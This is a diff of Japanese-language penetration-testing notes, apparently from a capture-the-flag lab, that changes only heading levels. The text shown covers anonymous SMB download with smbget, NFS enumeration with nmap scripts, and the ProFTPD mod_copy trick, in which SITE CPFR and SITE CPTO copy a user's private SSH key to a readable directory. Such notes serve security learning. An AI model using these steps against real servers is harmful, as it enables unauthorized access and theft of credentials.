@@ -18,7 +18,7 @@
 ###SMB 経由でファイルをダウンロード
 ~~~smbget -R smb://10.10.162.244/anonymous~~~
 
-###ポート111が開いている場合はマウント可能なディレクトリがないか調べることができる
+##ポート111が開いている場合はマウント可能なディレクトリがないか調べることができる
 ~~~nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.208.182~~~
 
 ### mod_copy モジュールは SITE CPFR と SITE CPTO コマンドを実装しており、
@@ -28,8 +28,8 @@
 例:
 ~~~nc $IP 21~~~
 
-# コピー元のファイルを指定する
+###コピー元のファイルを指定する
 ~~~SITE CPFR /home/kenobi/.ssh/id_rsa~~~
 
-# コピー先を指定する
+###コピー先を指定する
 ~~~SITE CPTO /var/tmp/id_rsa~~~
